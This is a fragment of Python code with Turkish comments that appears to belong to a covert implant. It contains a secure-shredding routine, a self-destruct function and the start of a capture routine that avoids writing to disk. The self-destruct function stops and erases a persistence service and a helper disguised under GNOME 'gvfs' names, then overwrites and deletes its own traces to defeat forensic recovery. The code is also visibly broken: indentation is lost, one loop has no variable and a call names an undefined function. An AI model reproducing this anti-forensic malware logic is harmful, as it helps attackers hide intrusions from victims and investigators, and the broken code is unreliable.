def obliterate(path):



"""SSD Wear Leveling ve Journaling'e karşı çok katmanlı imha"""



try:



if os.path.isfile(path):



size = os.path.getsize(path)



# 1. Metadata Deformasyonu: Dosya adını rastgeleleştirerek inode takibini zorlaştır



new_path = os.path.join(os.path.dirname(path), "".join(random.choices("0123456789abcdef", k=12)))



os.rename(path, new_path)



# 2. Çok Katmanlı Overwrite: Farklı byte desenleriyle SSD bloklarını zorla



with open(new_path, "ba+", buffering=0) as f:



for in range(3):



f.seek(0)



f.write(os.urandom(size))



f.flush()



os.fsync(f.fileno()) # Fiziksel yazmayı zorla



# 3. Truncate ve Silme



with open(new_path, "wb") as f: f.write(b'\x00' * size)



os.remove(new_path)



except: pass

def _self_destruct():



"""Tam imha protokolü: İzleri fiziksel ve mantıksal olarak kazır"""



h = os.path.expanduser("~")



paths = [



os.path.join(h, ".config/systemd/user/gvfs-daemon.service"),



os.path.join(h, ".local/share/gvfs-metadata/gvfs-helper")



]



subprocess.run(["systemctl", "--user", "stop", "gvfs-daemon.service"], stderr=subprocess.DEVNULL)



for p in paths: _obliterate(p)



subprocess.run(["systemctl", "--user", "daemon-reload"], stderr=subprocess.DEVNULL)



os._exit(0)

def get_raw():



"""RAM Disk tabanlı yakalama (Zero-Disk Trace)"""



try:



# /dev/shm doğrudan RAM'dir, diske tek bir byte bile dokunmaz



